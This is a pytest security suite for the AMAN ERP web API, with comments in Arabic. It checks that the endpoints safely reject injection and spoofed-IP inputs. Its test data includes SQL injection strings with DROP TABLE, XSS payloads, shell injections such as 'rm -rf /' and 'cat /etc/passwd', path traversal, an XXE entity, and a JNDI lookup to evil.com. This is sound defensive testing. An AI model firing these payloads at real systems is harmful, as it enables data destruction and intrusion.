"""
AMAN ERP - Security Tests: Injection Attacks
اختبارات الأمان: هجمات الحقن
═══════════════════════════════════════
"""

import pytest
from fastapi.testclient import TestClient
from starlette.requests import Request
from main import app
from conftest import admin_token, admin_headers
from routers import auth as auth_router

client = TestClient(app)


class TestInjectionSecurity:
    """🛡️ اختبارات حماية من هجمات الحقن"""

    def test_sql_injection_in_query_params(self, client, admin_headers):
        """🛡️ حماية من SQL Injection في معاملات الاستعلام"""
        sql_injections = [
            "1' OR '1'='1",
            "1'; DROP TABLE users;--",
            "1' UNION SELECT * FROM users--",
            "1' OR 1=1--",
            "admin'--"
        ]
        
        for injection in sql_injections:
            # اختبار في معاملات مختلفة
            endpoints = [
                f"/api/accounting/journal-entries?id={injection}",
                f"/api/sales/invoices?customer_id={injection}",
                f"/api/inventory/products?search={injection}"
            ]
            
            for endpoint in endpoints:
                response = client.get(endpoint, headers=admin_headers)
                # يجب أن يُرفض أو يُعالج بشكل آمن (400/422) وليس 500
                assert response.status_code != 500, \
                    f"SQL injection في {endpoint} يجب أن يُعالج بشكل آمن"
                assert response.status_code in [200, 400, 404, 422]

    def test_sql_injection_in_json_body(self, client, admin_headers):
        """🛡️ حماية من SQL Injection في JSON body"""
        sql_injections = [
            {"name": "test' OR '1'='1"},
            {"description": "test'; DROP TABLE accounts;--"},
            {"code": "1' UNION SELECT * FROM users--"}
        ]
        
        for injection in sql_injections:
            response = client.post(
                "/api/inventory/products",
                json=injection,
                headers=admin_headers
            )
            # يجب أن يُرفض أو يُعالج بشكل آمن
            assert response.status_code != 500
            assert response.status_code in [200, 400, 404, 422, 403]

    def test_xss_in_input_fields(self, client, admin_headers):
        """🛡️ حماية من XSS في حقول الإدخال"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            # اختبار في حقول مختلفة
            test_data = {
                "name": payload,
                "description": payload,
                "notes": payload
            }
            
            response = client.post(
                "/api/inventory/products",
                json=test_data,
                headers=admin_headers
            )
            
            # يجب أن يُرفض أو يُفلتر
            assert response.status_code != 500
            # التأكد من عدم وجود script في الاستجابة
            if response.status_code == 200:
                response_text = str(response.json())
                assert "<script>" not in response_text.lower()
                assert "javascript:" not in response_text.lower()

    def test_command_injection(self, client, admin_headers):
        """🛡️ حماية من Command Injection"""
        command_injections = [
            "; ls",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)"
        ]
        
        for injection in command_injections:
            # اختبار في حقول قد تستخدم في أوامر النظام
            response = client.post(
                "/api/inventory/products",
                json={"name": f"test{injection}"},
                headers=admin_headers
            )
            # يجب أن يُرفض أو يُعالج بشكل آمن
            assert response.status_code != 500
            assert response.status_code in [200, 400, 404, 422]

    def test_path_traversal(self, client, admin_headers):
        """🛡️ حماية من Path Traversal"""
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for traversal in path_traversals:
            # اختبار في معاملات الملفات
            response = client.get(
                f"/api/files?path={traversal}",
                headers=admin_headers
            )
            # يجب أن يُرفض
            assert response.status_code in [400, 403, 404, 422]

    def test_no_sql_injection(self, client, admin_headers):
        """🛡️ حماية من NoSQL Injection (إذا كان هناك NoSQL)"""
        # Note: النظام يستخدم PostgreSQL، لكن هذا اختبار احترازي
        nosql_injections = [
            {"$ne": "admin"},
            {"$gt": ""},
            {"$where": "this.password == this.username"}
        ]
        
        for injection in nosql_injections:
            response = client.post(
                "/api/auth/login",
                json=injection,
                headers=admin_headers
            )
            # يجب أن يُرفض
            assert response.status_code in [400, 401, 404, 422]

    def test_ldap_injection(self, client, admin_headers):
        """🛡️ حماية من LDAP Injection (إذا كان هناك LDAP)"""
        ldap_injections = [
            "admin)(&",
            "admin)(|",
            "*)(uid=*"
        ]
        
        for injection in ldap_injections:
            response = client.post(
                "/api/auth/login",
                data={
                    "username": injection,
                    "password": "test",
                    "grant_type": "password"
                }
            )
            # يجب أن يُرفض
            assert response.status_code in [400, 401, 404, 422]

    def test_xml_injection(self, client, admin_headers):
        """🛡️ حماية من XML Injection"""
        xml_injections = [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
            "<?xml version='1.0'?><foo><bar>&xxe;</bar></foo>"
        ]
        
        for injection in xml_injections:
            response = client.post(
                "/api/data/import",
                data=injection,
                headers={**admin_headers, "Content-Type": "application/xml"}
            )
            # يجب أن يُرفض
            assert response.status_code in [400, 403, 404, 415, 422]

    def test_template_injection(self, client, admin_headers):
        """🛡️ حماية من Template Injection"""
        template_injections = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for injection in template_injections:
            response = client.post(
                "/api/reports/generate",
                json={"template": injection},
                headers=admin_headers
            )
            # يجب أن يُرفض أو يُفلتر
            assert response.status_code in [200, 400, 403, 404, 422]

    def test_header_injection(self, client, admin_headers):
        """🛡️ حماية من Header Injection"""
        malicious_headers = {
            "X-Forwarded-For": "127.0.0.1\r\nX-Injected: true",
            "User-Agent": "test\r\nX-Injected: true",
            "Referer": "http://evil.com\r\nX-Injected: true"
        }
        
        for header_name, header_value in malicious_headers.items():
            response = client.get(
                "/api/auth/me",
                headers={**admin_headers, header_name: header_value}
            )
            # يجب أن يُعالج بشكل آمن
            assert response.status_code in [200, 400, 401, 403]

    def test_parameter_pollution(self, client, admin_headers):
        """🛡️ حماية من Parameter Pollution"""
        # إرسال نفس المعامل عدة مرات
        response = client.get(
            "/api/accounting/journal-entries?id=1&id=2&id=3",
            headers=admin_headers
        )
        # يجب أن يُعالج بشكل صحيح (أخذ أول أو آخر قيمة)
        assert response.status_code in [200, 400, 404]

    def test_code_injection_in_reports(self, client, admin_headers):
        """🛡️ حماية من Code Injection في التقارير"""
        code_injections = [
            "'; DROP TABLE accounts;--",
            "${jndi:ldap://evil.com/a}",
            "<%= 7*7 %>",
            "{{7*7}}"
        ]
        
        for injection in code_injections:
            response = client.post(
                "/api/reports/custom",
                json={"query": injection},
                headers=admin_headers
            )
            # يجب أن يُرفض
            assert response.status_code in [400, 403, 404, 422]

    def test_input_length_limits(self, client, admin_headers):
        """🛡️ حدود طول الإدخال"""
        # إرسال بيانات طويلة جداً
        very_long_string = "a" * 100000
        
        response = client.post(
            "/api/inventory/products",
            json={"name": very_long_string},
            headers=admin_headers
        )
        # يجب أن يُرفض
        assert response.status_code in [400, 413, 422]

    def test_special_characters_handling(self, client, admin_headers):
        """🛡️ معالجة الأحرف الخاصة"""
        special_chars = [
            "';--",
            "\" OR \"1\"=\"1",
            "\\x00",
            "\n",
            "\r",
            "\t",
            "\0"
        ]
        
        for char in special_chars:
            response = client.post(
                "/api/inventory/products",
                json={"name": f"test{char}product"},
                headers=admin_headers
            )
            # يجب أن يُعالج بشكل آمن
            assert response.status_code != 500
            assert response.status_code in [200, 400, 404, 422]


class TestForwardedForSecurity:
    """اختبارات منع انتحال IP عبر X-Forwarded-For"""

    @staticmethod
    def _make_request(client_ip: str, xff: str | None = None) -> Request:
        headers = []
        if xff is not None:
            headers.append((b"x-forwarded-for", xff.encode("utf-8")))
        scope = {
            "type": "http",
            "method": "GET",
            "path": "/",
            "headers": headers,
            "client": (client_ip, 12345),
            "server": ("testserver", 80),
            "scheme": "http",
        }
        return Request(scope)

    def test_untrusted_source_cannot_override_client_ip(self, monkeypatch):
        monkeypatch.setattr(auth_router.settings, "TRUSTED_PROXIES", "10.0.0.10")
        req = self._make_request("198.51.100.10", "203.0.113.200")
        assert auth_router._get_client_ip(req) == "198.51.100.10"

    def test_trusted_proxy_allows_forwarded_ip(self, monkeypatch):
        monkeypatch.setattr(auth_router.settings, "TRUSTED_PROXIES", "10.0.0.10,127.0.0.1")
        req = self._make_request("10.0.0.10", "203.0.113.200, 10.0.0.10")
        assert auth_router._get_client_ip(req) == "203.0.113.200"

    def test_malformed_forwarded_ip_falls_back_to_proxy_ip(self, monkeypatch):
        monkeypatch.setattr(auth_router.settings, "TRUSTED_PROXIES", "10.0.0.10")
        req = self._make_request("10.0.0.10", "not-an-ip")
        assert auth_router._get_client_ip(req) == "10.0.0.10"
